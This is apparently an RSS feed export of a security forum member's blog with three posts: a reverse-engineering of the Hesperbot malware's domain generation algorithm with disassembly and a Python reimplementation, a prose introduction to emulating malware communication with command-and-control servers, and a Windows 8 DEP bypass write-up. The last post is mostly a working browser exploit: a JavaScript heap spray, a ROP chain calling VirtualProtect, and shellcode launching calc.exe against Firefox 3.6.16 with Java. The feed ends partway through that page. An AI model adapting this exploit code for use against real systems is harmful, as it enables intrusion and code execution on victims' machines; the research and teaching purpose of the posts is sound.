<?xml version="1.0" encoding="ISO-8859-1"?>

<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
	<channel>
		<title><![CDATA[Garage4hackers Forum - Blogs - &quot;vinnu&quot;]]></title>
		<link>http://garage4hackers.com/blog.php?u=61</link>
		<description>Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research.</description>
		<language>en</language>
		<lastBuildDate>Sun, 22 Mar 2020 10:34:24 GMT</lastBuildDate>
		<generator>vBulletin</generator>
		<ttl>60</ttl>
		<image>
			<url>http://garage4hackers.com/images/misc/rss.jpg</url>
			<title><![CDATA[Garage4hackers Forum - Blogs - &quot;vinnu&quot;]]></title>
			<link>http://garage4hackers.com/blog.php?u=61</link>
		</image>
		<item>
			<title>Hesperbot DGA : Everything is Dynamically generated using GA</title>
			<link>http://garage4hackers.com/entry.php?b=3091</link>
			<pubDate>Mon, 10 Nov 2014 06:31:29 GMT</pubDate>
			<description>Hesperbot DGA : Everything is Dynamically generated using GA 
Our next contender for DGA series is Hesperbot. It generates all strings/object-names...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Hesperbot DGA : Everything is Dynamically generated using GA<br />
Our next contender for DGA series is Hesperbot. It generates all strings/object-names dynamically using various &quot;Generation Algorithms&quot;<br />
similar to DGA. Though its DGA differs from NGA (Name generation algorithm) used for name generation for objects like filenames, foldernames,<br />
mutexes etc.<br />
<br />
But both DGA &amp; NGA utilises same seed generator. Hesperbot's DGA is free from date/time and generates same series of domain names<br />
for any salt/magic-number. The salt/magic-number may differ across different samples. Also it generates TLD<br />
dynamically all this makes this DGA non-spottable &amp; unconventional.<br />
<br />
So where should we start now?  Its bit difficult to track the DGA in action as it may either start in legitimate <br />
Explorer.exe otherwise in child process. Hesperbot starts a child named &quot;explorer.exe&quot; and also injects same code inside legitimate<br />
&quot;Explorer.exe&quot; &amp; terminates original parent process. We can debug both explorers or initially only child explorer.exe as you wish.<br />
<br />
We are again only interested in DGA and not going to discus how the the sample unpacks/injects the code etc.<br />
<br />
From api tracing we discovered that &quot;RtlFreeHeap&quot; is called several times. We set a breakpoint on &quot;RtlFreeHeap&quot;.<br />
It pops several times including the generation of mutex which starts like &quot;lock_.....&quot; like that.<br />
<br />
Let the RtlFreeHeap return and we check the executing code trail. One specific call which looks interestign and is made across several<br />
other subroutines as well is for a subroutine at 0x0009FC4B which is<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">0009FC4B   55               PUSH EBP
0009FC4C   8BEC             MOV EBP,ESP
0009FC4E   83EC 10          SUB ESP,10
0009FC51   837D 08 00       CMP DWORD PTR SS:[EBP+8],0
0009FC55   57               PUSH EDI
0009FC56   8BF9             MOV EDI,ECX
0009FC58   C745 F4 810349B0 MOV DWORD PTR SS:[EBP-C],B0490381
0009FC5F   B9 F988E254      MOV ECX,54E288F9
0009FC64   C745 FC 7C683106 MOV DWORD PTR SS:[EBP-4],631687C
0009FC6B   8945 F8          MOV DWORD PTR SS:[EBP-8],EAX
0009FC6E   74 53            JE SHORT 0009FCC3
0009FC70   53               PUSH EBX
0009FC71   56               PUSH ESI
0009FC72   EB 03            JMP SHORT 0009FC77
0009FC74   8B4D F0          MOV ECX,DWORD PTR SS:[EBP-10]
0009FC77   8BC7             MOV EAX,EDI
0009FC79   C1E0 0B          SHL EAX,0B
0009FC7C   33C7             XOR EAX,EDI
0009FC7E   8B7D F4          MOV EDI,DWORD PTR SS:[EBP-C]
0009FC81   894D F4          MOV DWORD PTR SS:[EBP-C],ECX
0009FC84   8B4D FC          MOV ECX,DWORD PTR SS:[EBP-4]
0009FC87   894D F0          MOV DWORD PTR SS:[EBP-10],ECX
0009FC8A   C1E9 0B          SHR ECX,0B
0009FC8D   33C8             XOR ECX,EAX
0009FC8F   C1E9 08          SHR ECX,8
0009FC92   33C8             XOR ECX,EAX
0009FC94   314D FC          XOR DWORD PTR SS:[EBP-4],ECX
0009FC97   6A 04            PUSH 4
0009FC99   5E               POP ESI
0009FC9A   3975 08          CMP DWORD PTR SS:[EBP+8],ESI
0009FC9D   73 03            JNB SHORT 0009FCA2
0009FC9F   8B75 08          MOV ESI,DWORD PTR SS:[EBP+8]
0009FCA2   85F6             TEST ESI,ESI
0009FCA4   74 13            JE SHORT 0009FCB9
0009FCA6   8B4D F8          MOV ECX,DWORD PTR SS:[EBP-8]
0009FCA9   8D45 FC          LEA EAX,DWORD PTR SS:[EBP-4]
0009FCAC   2BC1             SUB EAX,ECX
0009FCAE   8BD6             MOV EDX,ESI
0009FCB0   8A1C08           MOV BL,BYTE PTR DS:[EAX+ECX]
0009FCB3   8819             MOV BYTE PTR DS:[ECX],BL
0009FCB5   41               INC ECX
0009FCB6   4A               DEC EDX
0009FCB7  ^75 F7            JNZ SHORT 0009FCB0
0009FCB9   0175 F8          ADD DWORD PTR SS:[EBP-8],ESI
0009FCBC   2975 08          SUB DWORD PTR SS:[EBP+8],ESI
0009FCBF  ^75 B3            JNZ SHORT 0009FC74
0009FCC1   5E               POP ESI
0009FCC2   5B               POP EBX
0009FCC3   5F               POP EDI
0009FCC4   C9               LEAVE
0009FCC5   C3               RETN</pre>
</div>It appears like seed generator as it generates long binary string.<br />
Let us check which subroutines are calling it? A reference check returns following results :<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:120px;">References in 00090000..000A7FFF to 0009FC4B
Address    Disassembly                               Comment
000966D3   CALL 0009FC4B
0009ACBB   CALL 0009FC4B
0009ADA1   CALL 0009FC4B
0009CE25   CALL 0009FC4B
0009FC4B   PUSH EBP                                  (Initial CPU selection)
000A083B   CALL 0009FC4B</pre>
</div>Its not easy to land in Hesperbot's DGA directly. Let us one-by-one check all these routines<br />
and set breakpoints on them accordingly in each fresh execution. Also Give network access to your VM after<br />
you set BP on those routines.<br />
I would suggest to search for similar codeblock across all memory blocks and set breakpoints in references in<br />
all blocks.<br />
<br />
Most of the referencing routines are generating other stuff, but only interesting routine that has reference to this seed generator<br />
is one that is calling it from <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">0009CE25   CALL 0009FC4B</pre>
</div>Let us check the routine and its logical execution flow:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">0009CDF4   55               PUSH EBP
0009CDF5   8BEC             MOV EBP,ESP
0009CDF7   8B06             MOV EAX,DWORD PTR DS:[ESI]
0009CDF9   83EC 18          SUB ESP,18
0009CDFC   57               PUSH EDI
0009CDFD   85C0             TEST EAX,EAX
0009CDFF   75 07            JNZ SHORT 0009CE08
0009CE01   8D7E 10          LEA EDI,DWORD PTR DS:[ESI+10]
0009CE04   6A 1A            PUSH 1A
0009CE06   EB 4B            JMP SHORT 0009CE53
0009CE08   50               PUSH EAX
0009CE09   E8 BFFFFFFF      CALL 0009CDCD  ; Salt generator

; This section determines the length of domain name 
0009CE0E   59               POP ECX
0009CE0F   6A 19            PUSH 19
0009CE11   5F               POP EDI
0009CE12   33D2             XOR EDX,EDX
0009CE14   8BC8             MOV ECX,EAX
0009CE16   F7F7             DIV EDI
0009CE18   6A 08            PUSH 8
0009CE1A   5F               POP EDI
0009CE1B   3BD7             CMP EDX,EDI
0009CE1D   76 02            JBE SHORT 0009CE21
0009CE1F   8BFA             MOV EDI,EDX
0009CE21   57               PUSH EDI
;-----------

0009CE22   8D45 E8          LEA EAX,DWORD PTR SS:[EBP-18]
0009CE25   E8 212E0000      CALL 0009FC4B ; Call to seed generator
0009CE2A   59               POP ECX
0009CE2B   33C9             XOR ECX,ECX
0009CE2D   85FF             TEST EDI,EDI
0009CE2F   74 1C            JE SHORT 0009CE4D
0009CE31   53               PUSH EBX
0009CE32   0FB6440D E8      MOVZX EAX,BYTE PTR SS:[EBP+ECX-18] ; The seed
0009CE37   99               CDQ
0009CE38   6A 1A            PUSH 1A  ; 0x1A == 26 == number of alfabets
0009CE3A   5B               POP EBX
0009CE3B   F7FB             IDIV EBX
0009CE3D   41               INC ECX
0009CE3E   8A82 783D0A00    MOV AL,BYTE PTR DS:[EDX+A3D78]  ; &quot;abcdefghijklmnopqrstuvwxyz&quot;
0009CE44   88440E 0F        MOV BYTE PTR DS:[ESI+ECX+F],AL  ; Byte Appended to domain name
0009CE48   3BCF             CMP ECX,EDI
0009CE4A  ^72 E6            JB SHORT 0009CE32
0009CE4C   5B               POP EBX
0009CE4D   8D7C31 10        LEA EDI,DWORD PTR DS:[ECX+ESI+10]
0009CE51   6A 19            PUSH 19
0009CE53   59               POP ECX
0009CE54   E8 17A8FFFF      CALL 00097670 ; Appends Top-Level-Domain i.e. &quot;.com&quot;
0009CE59   33C0             XOR EAX,EAX
0009CE5B   40               INC EAX
0009CE5C   5F               POP EDI
0009CE5D   C9               LEAVE
0009CE5E   C3               RETN

0009CE5F   56               PUSH ESI
0009CE60   57               PUSH EDI
0009CE61   6A 2F            PUSH 2F
0009CE63   8BF0             MOV ESI,EAX
0009CE65   33FF             XOR EDI,EDI
0009CE67   58               POP EAX
0009CE68   48               DEC EAX
0009CE69   C60430 00        MOV BYTE PTR DS:[EAX+ESI],0 ; Memset
0009CE6D  ^75 F9            JNZ SHORT 0009CE68
0009CE6F   8B4424 0C        MOV EAX,DWORD PTR SS:[ESP+C]
0009CE73   8906             MOV DWORD PTR DS:[ESI],EAX
0009CE75   B8 BB010000      MOV EAX,1BB 
0009CE7A   66:8946 2D       MOV WORD PTR DS:[ESI+2D],AX
0009CE7E   E8 71FFFFFF      CALL 0009CDF4 ; Call to Domain Name Generator
0009CE83   85C0             TEST EAX,EAX
0009CE85   74 03            JE SHORT 0009CE8A
0009CE87   33FF             XOR EDI,EDI
0009CE89   47               INC EDI
0009CE8A   8BC7             MOV EAX,EDI
0009CE8C   5F               POP EDI
0009CE8D   5E               POP ESI
0009CE8E   C3               RETN</pre>
</div><br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:204px;">; Salt generator :
0009CDCD   33C9             XOR ECX,ECX
0009CDCF   B8 8F897827      MOV EAX,2778898F ; 0x2778898F is Magic number. It may differ in some samples.
0009CDD4   394C24 04        CMP DWORD PTR SS:[ESP+4],ECX
0009CDD8   76 19            JBE SHORT 0009CDF3
0009CDDA   8BD1             MOV EDX,ECX
0009CDDC   C1E2 09          SHL EDX,9
0009CDDF   0FAFD0           IMUL EDX,EAX
0009CDE2   81F2 3D44BD4E    XOR EDX,4EBD443D
0009CDE8   03D1             ADD EDX,ECX
0009CDEA   03C2             ADD EAX,EDX
0009CDEC   41               INC ECX
0009CDED   3B4C24 04        CMP ECX,DWORD PTR SS:[ESP+4]
0009CDF1  ^72 E7            JB SHORT 0009CDDA
0009CDF3   C3               RET</pre>
</div><div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:288px;">TLD generator :
00097670   56               PUSH ESI
00097671   33F6             XOR ESI,ESI
00097673   3934CD 04540A00  CMP DWORD PTR DS:[ECX*8+A5404],ESI
0009767A   76 28            JBE SHORT 000976A4
0009767C   53               PUSH EBX
0009767D   33D2             XOR EDX,EDX
0009767F   6A 29            PUSH 29
00097681   8BC6             MOV EAX,ESI
00097683   5B               POP EBX
00097684   F7F3             DIV EBX
00097686   8B04CD 00540A00  MOV EAX,DWORD PTR DS:[ECX*8+A5400]
0009768D   8A92 8C500A00    MOV DL,BYTE PTR DS:[EDX+A508C]
00097693   321430           XOR DL,BYTE PTR DS:[EAX+ESI]
00097696   88143E           MOV BYTE PTR DS:[ESI+EDI],DL
00097699   46               INC ESI
0009769A   3B34CD 04540A00  CMP ESI,DWORD PTR DS:[ECX*8+A5404]
000976A1  ^72 DA            JB SHORT 0009767D
000976A3   5B               POP EBX
000976A4   C6043E 00        MOV BYTE PTR DS:[ESI+EDI],0
000976A8   5E               POP ESI
000976A9   C3               RETN</pre>
</div>The reversed Hesperbot DGA in python is as follow :<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">'''
   Developer : Garage4Hackers
   Greets : nightrover, b0nd, FB1H2S, &quot;vinnu&quot;, l0rdDeathStorm and all g4h team
'''
import time, os

family = &quot;Hesperbot&quot;
utility = family+&quot;-DGA&quot;

def initSeed(maxnum, salt):
    ecx = 0x54E288F9
    stack = [0xB0490381, # ebp-c
             0x0010F200,
             0x0631687C, # ebp-4
             ecx         # ebp-0x10 
            ]
    edi = salt
    rindex = maxnum
    i = maxnum
    buf = ''
    while i &gt; 0 :
        ecx = stack[3]
        eax = edi
        print &quot;[0] eax : %08x ecx : %08x edi : %08x&quot;% (eax, ecx, edi)
        eax = (eax &lt;&lt; 0x0B) &amp; 0xFFFFFFFF
        print &quot;[1] eax : %08x ecx : %08x edi : %08x&quot;% (eax, ecx, edi)
        eax = eax ^ edi
        print &quot;[2] eax : %08x ecx : %08x edi : %08x&quot;% (eax, ecx, edi)
        edi = stack[0]
        stack[0] = ecx
        print &quot;[3] eax : %08x ecx : %08x edi : %08x&quot;% (eax, ecx, edi)
        ecx = stack[2]
        print &quot;[4] eax : %08x ecx : %08x edi : %08x&quot;% (eax, ecx, edi)
        stack[3] = ecx
        #stack.append(ecx)
        ecx = (ecx &gt;&gt; 0x0B) &amp; 0xFFFFFFFF
        ecx = ecx ^ eax
        ecx = (ecx &gt;&gt; 0x08) &amp; 0xFFFFFFFF
        ecx = ecx ^ eax
        print &quot;eax : %08x ecx : %08x&quot;% (eax, ecx)
        stack[2] = stack[2] ^ ecx
        print &quot;stack[2] : %08x&quot;% (stack[2])
        esi = 4
        if rindex &lt;= esi :
            esi = rindex
        print &quot;esi : %08x&quot;% (esi)
        print &quot;stack[2] : %x&quot; % (stack[2])
        tmp = &quot;%08x&quot; % (stack[2])
        tmp = tmp.decode(&quot;hex&quot;)
        buf += tmp[::-1]
        print &quot;tmp[::-1] : %s&quot; % (tmp[::-1]).encode(&quot;hex&quot;)
        i -= esi
        #time.sleep(10)
    print &quot;buf : &quot;+buf.encode(&quot;hex&quot;)
    #time.sleep(10)
    return buf           
        

def addSalt(iteration):
    i = 0;
    magic = 0x2778898F # May differ across different samples
    #magic = 0x2461156F
    if iteration &gt; 0:
        for i in range(iteration):
            magic = (magic + ( i + ((magic * (i &lt;&lt; 9 &amp; 0xffffffff) &amp; 0xffffffff) ^ 0x4EBD443D) &amp; 0xffffffff) &amp; 0xffffffff) &amp; 0xffffffff
    return magic

def generateDomain(domlen, seed):
    alphabets = &quot;abcdefghijklmnopqrstuvwxyz&quot;
    domain = &quot;&quot;
    if domlen &gt; 0:
        for j in range(domlen):
            index = ord(seed[j]) % 0x1A
            domain += alphabets[index]
    domain += &quot;.com&quot;
    print &quot;domain : &quot;+domain
    return domain
  
def initDGA() :
    maxnum = 0x40 # 0x01BB
    domains = []
    for i in range (maxnum):
        magic = addSalt(i)
        edi = 0x19
        edx = 0
        eax = magic / edi
        edx = magic % edi
        edi = 8
        if edx &gt; edi :
            edi = edx
        seed = initSeed(edi, magic)
        domain = generateDomain(edi, seed)
        domains.append(domain)
    return domains

def init() :
    print &quot;[+] &quot;+utility+&quot; : initiated&quot;
    domains = initDGA()
    fp = open(&quot;hesperdomains.log&quot;, &quot;w&quot;)
    i = 0
    for domain in domains :
        if i == 0 :
            i += 1
            continue
        line = &quot;[%d] %s\n&quot; % (i, domain)
        fp.write(line)
        i += 1
    fp.close()
        
init()</pre>
</div></blockquote>

]]></content:encoded>
			<dc:creator><![CDATA["vinnu"]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3091</guid>
		</item>
		<item>
			<title>Malware Emulation - An Introduction</title>
			<link>http://garage4hackers.com/entry.php?b=3066</link>
			<pubDate>Sat, 14 Jun 2014 10:35:19 GMT</pubDate>
			<description>Namaste 
 
This post discuses the things from the point where reversing of any malware ends. 
The analysis of a malware is not enough to satisfy any...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Namaste<br />
<br />
This post discuses the things from the point where reversing of any malware ends.<br />
The analysis of a malware is not enough to satisfy any researcher. There is no point<br />
in analysing a malware and then writing a report on it and forgetting it for eternal times.<br />
Neither just analysing a malware will help stop botnet herders from performing crimes nor it will<br />
help a large population of non technical targets/victims.<br />
<br />
If analysing a malware brings you money for one time, then emulation  ensures a continuous flow of money<br />
for researchers/(research companies). In malware analysis the researcher analyses the malware behaviour and<br />
its communication with cnc, whereas in emulation, this observation and understanding of malware's communication<br />
with its cnc is emulated/simulated by research's own program/tool/script.<br />
<br />
An emulator is a program that emulates any malware's communication with its cnc. A successfull emulation requires<br />
emulator to communicate with cnc intelligently as original malware do without triggering any errors/faults on cnc server.<br />
Emulator's behaviour at cnc server end should be identical to other zombies.<br />
<br />
Emulator has generally two parts. First part extracts/analyses binary sample and extracts artifacts. The artifacts<br />
generally containes domain names, IP addresses, URLs, request pages, request methods, cryptographic keys, and all<br />
necessary items contained inside binary which are necessary for a successfully communicating with cnc server.<br />
<br />
Second part utilises the extracted information and communicates with cnc servers and fetches commands/directives/configs.<br />
The first part that extracts can also be called as Extractor whereas teh second part that communicates with cnc<br />
server is also called as communicator. The first part is necessary is any family of malware has different cncs or<br />
different networks. Otherwise one time analysed information is enough to emulate any family, if researcher has adequate<br />
supply of samples and different samples contain different artifacts, then extractor part is important to keep providing<br />
communicator with latest CnCs etc.<br />
<br />
Upon successfull communication with cnc server, the cnc server dispatches commands to zombies. These commands contains<br />
directives for zombies/bots to work/perform accordingly and control victim system.<br />
<br />
In cyberespionage botnets, these commands may have directives for uploading some specific files, keystrokes<br />
etc information to cnc server.<br />
<br />
Whereas in cyber crime botnets, these commands may have directives for hijacking financial/banking sessions and exfiltrating<br />
the hijacked information which may contain credit card details, account details etc to cnc server.<br />
<br />
Or these directives may contain information about spamming like, whome to spam(target email ids), spam tamplets, spam URLs,<br />
attachments, etc. These attachments may contain another malware. As botnets also send emails to campaign for other malwares.<br />
This also gives us some insite about the relationships among different malware families and their owners/herders.<br />
<br />
These commands/directives are precious and important and gives us prior information before any electronic heist/crime actually occurs.<br />
Or in case of spam configs, you may know exactly who will have which email prior to he himself checks his inbox.<br />
<br />
The main purpose of an emulator is to fetch these commands/directives also known as configs. The information contained inside<br />
these configs/directives is precious and it could be sold by researchers to the businesses which gets affected by these malware<br />
families directly/indirectly.<br />
<br />
The prerequisite for it is you should know atleast any programming language to develop an emulator,<br />
doesnt matter which language you chose, you should be able to perform cryptography, make socket connections<br />
to outer world, you should be able to write application/tools to debug &amp; extract the important information<br />
like cryptographic keys, cnc domain/ip addresses/urls values needed to communicate successfully with cnc<br />
from malware binary samples.<br />
<br />
The emulation of a malware is more an art than science. This science is still in its intial stage and is a very good field<br />
of interest for beginners in infosec. Beginners can flourish this field and alongewith can get paid by selling/sharing the<br />
grabbed information by emulators. Companies saves time in investing money and researcher can get very well paid.<br />
<br />
This is only an introductory article about malware emulators. With every new emulator by any researcher for any family,<br />
huge ammount of money can be saved from getting exfiltrated to criminals hands.<br />
<br />
...&quot;vinnu&quot;<br />
Team : &quot;Legion Of Xtremers&quot; &amp; G4H</blockquote>

]]></content:encoded>
			<dc:creator><![CDATA["vinnu"]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3066</guid>
		</item>
		<item>
			<title>Windows 8 DEP bypass</title>
			<link>http://garage4hackers.com/entry.php?b=270</link>
			<pubDate>Fri, 18 Nov 2011 03:41:23 GMT</pubDate>
			<description><![CDATA[[ Taken from Forum posts and edited ] 
 
Namaste 
 
This Time we'll colour our hands with the blood of windows 8 Developer's Preview edition. What we...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">[ Taken from Forum posts and edited ]<br />
<br />
Namaste<br />
<br />
This Time we'll colour our hands with the blood of windows 8 Developer's Preview edition. What we need , a target application, a vulnerability, and a debugger, and though notepad + calc also.<br />
<br />
So we have Windows 8 : Developer's Preview Edition<br />
Firefox : 3.6.16<br />
Java (JRE) : 6u29<br />
<br />
So what is the difference in windows7 and windows8 exploitation.<br />
To achieve code execution in win7 we just need a ROP chain to execute the VirtualProtect and then execute the shellcode.<br />
<br />
And the whole process is like:<br />
<br />
We steer the cpu by any instruction like &quot;call register&quot;, call dword ptr[register+offset],...etc<br />
And then a pivot of stack to our controlled (sprayed) heap block.<br />
And then the ROP chain will get execution and will proceed to execute and lay the stack for VirtualProtect() and finally after VirtualProtect the code execution is transferred to shellcode. <br />
<br />
But in windows 8 there is protection implemented in Virtual memory manipulating functions like VirtualProtect, VirtualAlloc, etc.<br />
The protection checks for the stack pointer (ESP register) to be inside the permitted range.<br />
And prior to execute the VirtualProtect function in our ROP chain, the stack pointer (ESP register) is checked to be present within this range.<br />
The range is taken from the TEB (Thread Environment Block), where stack's initial value and stacklimit are saved.<br />
<br />
If the ESP is greater than stacklimit or less than initial value, then it means a stack pivote has been carried out and and this will lead to raising an exception and failing the exploitation attempt.<br />
<br />
So how to bypass this protection? <br />
<br />
<br />
The answer is: what it requires, provide it.<br />
<br />
It requires the stack might be within the range of original ESP prior to stack pivote. And then make the call to VirtualProtect.<br />
<br />
So what we do actually is, we pivot the stack to our controlled heap block and preserve the original stack value into a register, then we pop the values from our controlled current stack and mov them into originl stack memory block and then decrease the register containing the original stack address by 4 bytes or a word and then move the next argument to VirtualProtect and again decreasing the value of original stack address in that register by 4 butes and finally the address of VirtualProtect can also be placed over the original stack block so that when we pivote back to original stack then the next return instruction will execute the VirtualProtect placed over the original stack block. <br />
<br />
Following is an old 0day. The vulnerability is silently patched for Firefox below 4.0:<br />
<br />
Requires : JRE 6u29 (Latest) or less.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">&lt;html&gt;
&lt;!-- ROP completed---&gt;
&lt;head&gt;
&lt;Title&gt;Windows 8 Calc payload&lt;/title&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
function ignite()	{
	var carpet = 0x200;
	var vftable = unescape(&quot;\x00% u0c10&quot;);
	var pLand = &quot;% u00fd% u0c10&quot;;
	var pShell = &quot;% u0000% u0c10&quot;;
	var oldProt = &quot;% u0000% u0c10&quot;;
	
	var heap = unescape(&quot;% u0101% u0102&quot;
					+&quot;% u0008% u0c10&quot;
					+&quot;% u0105% u0106&quot;
					+&quot;% u10c2% u7c34&quot;//&quot;% u0107% u0108&quot; pop ecx;pop ecx;ret
					+&quot;% u0109% u010a&quot;//
					+&quot;% u3134% u6d32&quot;//&quot;% u010b% u010c&quot;//&quot;% u6643% u6d6a&quot; // mov eax,[esi]
					+&quot;% u787f% u6d32&quot;//&quot;% u010d% u010e&quot;// xchg eax,esi;aam 0ff;dec ecx;ret
					+&quot;% u7b72% u6d83&quot;//&quot;% u010f% u0111&quot; // pop edx;ret
					+&quot;% u0000% u0c10&quot;//% u0112% u0113&quot; // will be popped in edx //
					+&quot;% u2a30% u6d7f&quot;//&quot;% u0114% u0115&quot; // mov ecx,esi;call [edx+50]
					+pLand//&quot;% u0116% u0117&quot; // Address in shellcode to land change it accordingly
					+&quot;% ue8d4% u6d7f&quot;//&quot;% u0118% u0119&quot;	// mov [ecx],eax;pop ebp;ret
					+&quot;% u011a% u011b&quot;// will be popped in ebp
					+&quot;% u1b02% u7c34&quot;//&quot;% u011c% u011d&quot; // dec ecx;ret
					+&quot;% u1b02% u7c34&quot;//&quot;% u011e% u011f&quot; // dec ecx;ret
					+&quot;% u1b02% u7c34&quot;//&quot;% u0120% u0121&quot; // dec ecx;ret
					+&quot;% u1b02% u7c34&quot;//&quot;% u0122% u0123&quot; // dec ecx;ret
					+&quot;% u4edc% u7c34&quot;//&quot;% u0122% u0123&quot; // pop eax;ret
					+oldProt//&quot;% u0124% u0125&quot; // pOldProtection
					+&quot;% ue8d4% u6d7f&quot;//&quot;% u0126% u0127&quot; // mov [ecx],eax;pop ebp;ret
					+&quot;% u4edb% u7c34&quot;//&quot;% u0128% u0129&quot; // pop ebx;pop eax;ret // needed in initial phase.
					+&quot;% u1b02% u7c34&quot;//&quot;% u012a% u012b&quot; // dec ecx;ret
					+&quot;% u1b02% u7c34&quot;//&quot;% u012c% u012d&quot; // dec ecx;ret
					+&quot;% u4edb% u7c34&quot;//&quot;% u012e% u012f&quot; // pop ebx;pop eax;ret
					+&quot;% u2643% u7c34&quot;//&quot;% u0130% u0131&quot; // xchg eax,esp;pop edi;add byte ptr ds:[eax],al;pop ecx,ret
					+&quot;% u0040% u0000&quot;//&quot;% u0132% u0133&quot; // newProptection = PAGE_READ_WRITE_EXECUTE
					+&quot;% u1b02% u7c34&quot;//&quot;% u0134% u0135&quot; // dec ecx;ret
					+&quot;% u1b02% u7c34&quot;//&quot;% u0136% u0137&quot; // dec ecx;ret
					+&quot;% ue8d4% u6d7f&quot;//&quot;% u0138% u0139&quot; // mov [ecx],eax;pop ebp;ret
					+&quot;% u013a% u013b&quot;// will be popped in ebp
					+&quot;% u1b02% u7c34&quot;//&quot;% u013c% u013d&quot; // dec ecx;ret
					+&quot;% u1b02% u7c34&quot;//&quot;% u013e% u013f&quot; // dec ecx;ret
					+&quot;% u1b02% u7c34&quot;//&quot;% u0140% u0141&quot; // dec ecx;ret
					+&quot;% u1b02% u7c34&quot;//&quot;% u0142% u0143&quot; // dec ecx;ret
					
					+&quot;% u4edc% u7c34&quot;//&quot;% u0144% u0145&quot; // pop eax;ret
					+&quot;% u0000% u0010&quot;//&quot;% u0146% u0147&quot; // Size
					+&quot;% ue8d4% u6d7f&quot;//&quot;% u0148% u0149&quot; // mov [ecx],eax;pop ebp;ret
					+&quot;% u014a% u014b&quot;// Will be popped in ebp.
					+&quot;% u1b02% u7c34&quot;//&quot;% u014c% u014d&quot; // dec ecx;ret
					+&quot;% u1b02% u7c34&quot;//&quot;% u014e% u014f&quot; // dec ecx;ret
					+&quot;% u1b02% u7c34&quot;//&quot;% u0150% u0151&quot; // dec ecx;ret
					+&quot;% u1b02% u7c34&quot;//&quot;% u0152% u0153&quot; // dec ecx;ret
					
					+&quot;% u4edc% u7c34&quot;//&quot;% u0144% u0145&quot; // pop eax;ret
					+pShell//&quot;% u0146% u0147&quot; // Address Of Shellcode block to change protection.
					+&quot;% ue8d4% u6d7f&quot;//&quot;% u0148% u0149&quot; // mov [ecx],eax;pop ebp;ret
					+&quot;% u014a% u014b&quot;// Will be popped in ebp.
/*					+&quot;% u1b02% u7c34&quot;//&quot;% u014c% u014d&quot; // dec ecx;ret
					+&quot;% u1b02% u7c34&quot;//&quot;% u014e% u014f&quot; // dec ecx;ret
					+&quot;% u1b02% u7c34&quot;//&quot;% u0150% u0151&quot; // dec ecx;ret
					+&quot;% u1b02% u7c34&quot;//&quot;% u0152% u0153&quot; // dec ecx;ret
*/					+&quot;% u4cc1% u7c34&quot;//&quot;% u0154% u0155&quot; // pop eax;ret
					+&quot;% u9611% u7c34&quot;//&quot;% u0156% u0157&quot; // will be popped in eax. pop edi;pop ebx;pop ebp;ret
					+&quot;% u347a% u7c34&quot;//&quot;% u0158% u0159&quot; // push esi;push edi;call eax
					+&quot;% u4edc% u7c34&quot;//&quot;% u015a% u015b&quot; // pop eax;ret
					+&quot;% u00e0% u0c10&quot;//&quot;% u015c% u015d&quot; // will be popped in eax.
					
					/* Need to fix the ebp for proper landing on shellcode */
					+&quot;% uc420% u6d99&quot;// dec ebp;ret
					+&quot;% uc420% u6d99&quot;// dec ebp;ret
					+&quot;% uc420% u6d99&quot;// dec ebp;ret
					+&quot;% uc420% u6d99&quot;// dec ebp;ret
					
					
					+&quot;% u1f0a% u7c34&quot;//&quot;% u015e% u015f&quot; // mov esp,ecx;mov ecx[eax];mov eax,[eax+4];push eax;ret
					+&quot;% u0160% u0161&quot;
					+&quot;% u28dd% u7c35&quot;//&quot;% u0162% u0163&quot; // VirtualProtect
					+&quot;% u0164% u0165&quot;
					+&quot;% u0166% u0167&quot;
					+&quot;% u0168% u0169&quot;
					+&quot;% u016a% u016b&quot;
					+&quot;% u016c% u016d&quot;
					)
/* Shellcode : */	+unescape(&quot;% u9090% u9090% u9090% u9090&quot;
					+&quot;% u585b&quot; // pop ebx;pop eax;
					+&quot;% u0a05% u0a13% u9000&quot; // add eax,0a130a
					+&quot;% u008b&quot; // mov eax,[eax]
					+&quot;% u056a&quot; // push 05
					+&quot;% uc581% u0128% u0000&quot; // add ebp,114
					+&quot;% u9055&quot; // push ebp;nop
					+&quot;% u1505% u04d6% u9000&quot; // add eax,4d615
					+&quot;% ud0ff&quot; // call eax
					+&quot;% uBBBB% uCCCC% uDDDD% uEEEE&quot;
/* command: */		+&quot;% u6163% u636c% u652e% u6578% u0000% ucccc&quot;	// calc.exe
					);
		var vtable = unescape(&quot;\x04% u0c10&quot;);
        while(vtable.length &lt; 0x10000) {vtable += vtable;}
        var heapblock = heap+vtable.substring(0,0x10000/2-heap.length*2);
        while (heapblock.length&lt;0x80000) {heapblock += heap+heapblock;}
		var finalspray = heapblock.substring(0,0x80000 - heap.length - 0x24/2 - 0x4/2 - 0x2/2);
        var spray = new Array();
        for (var iter=0;iter&lt;carpet;iter++){
            spray[iter] = finalspray+heap;
        }
/* vulnerability trigger : */		
		var arrobject = [0x444444444444];
		for(;true;){(arrobject[0])++;}
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;applet src=&quot;test.class&quot; width=10 height=10&gt;&lt;/applet&gt;
